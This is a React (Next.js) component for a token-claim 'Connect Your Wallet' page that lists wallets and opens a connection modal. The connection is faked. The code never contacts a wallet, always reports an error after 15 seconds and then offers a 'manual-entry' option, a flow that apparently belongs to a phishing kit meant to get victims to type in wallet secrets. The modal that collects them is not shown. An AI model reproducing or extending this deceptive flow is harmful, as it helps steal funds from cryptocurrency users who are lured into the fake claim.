"use client";

import Modal from "@/components/modal";
import { wallets } from "@/lib/data";
import { Wallet, ConnectionStatus } from "@/types";
import { ArrowRight } from "lucide-react";
import Image from "next/image";
import React, { useState } from "react";

// interface IWallets {
//     selectWallet: (walletId: string) => void;
// }

export default function Wallets() {
    const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [connectionStatus, setConnectionStatus] = useState<ConnectionStatus>("");

    const selectWallet = (walletId: string) => {
        setSelectedWallet(walletId);
        setIsModalOpen(true);
        startConnectionProcess();
    };

    const tryAgain = () => {
        startConnectionProcess();
    };

    const showManualEntry = () => {
        setConnectionStatus("manual-entry");
    };

    const startConnectionProcess = () => {
        setConnectionStatus("connecting");

        // Always show error after 15 seconds
        setTimeout(() => {
            setConnectionStatus("error");
        }, 15000);
    };

    const getWalletDetails = () => {
        return wallets.find((wallet) => wallet.id === selectedWallet);
    };

    return (
        <>
            <div className="w-full max-w-6xl mx-auto px-6 py-8">
                <div className="mb-8">
                    <h2 className="text-2xl font-bold mt-4">Connect Your Wallet</h2>
                    <p className="text-slate-400 mt-2">
                        Select your preferred wallet to verify eligibility and claim your tokens.
                    </p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-4">
                    {wallets.map((wallet) => (
                        <button
                            key={wallet.id}
                            className="bg-slate-800/50 hover:bg-slate-700/50 border border-slate-700 hover:border-purple-500/50 rounded-lg p-4 text-left transition-all flex items-center justify-between group cursor-pointer"
                            onClick={() => selectWallet(wallet.id)}
                        >
                            <div className="flex items-center">
                                <div className="w-10 h-10 mr-3 flex-shrink-0 rounded-full overflow-hidden bg-slate-700 group-hover:ring-2 group-hover:ring-purple-500/50 transition-all">
                                    <Image
                                        src={wallet.icon || "/placeholder.svg"}
                                        alt={wallet.name}
                                        width={40}
                                        height={40}
                                    />
                                </div>
                                <div>
                                    <div className="font-medium">{wallet.name}</div>
                                    {wallet.popular && (
                                        <div className="text-xs text-purple-400">Popular</div>
                                    )}
                                </div>
                            </div>
                            <ArrowRight className="h-4 w-4 text-slate-500 group-hover:text-purple-400 transition-colors" />
                        </button>
                    ))}
                </div>
            </div>
            <Modal
                isModalOpen={isModalOpen}
                setIsModalOpen={setIsModalOpen}
                wallet={getWalletDetails() as Wallet}
                connectionStatus={connectionStatus}
                tryAgain={tryAgain}
                showManualEntry={showManualEntry}
            />
        </>
    );
}
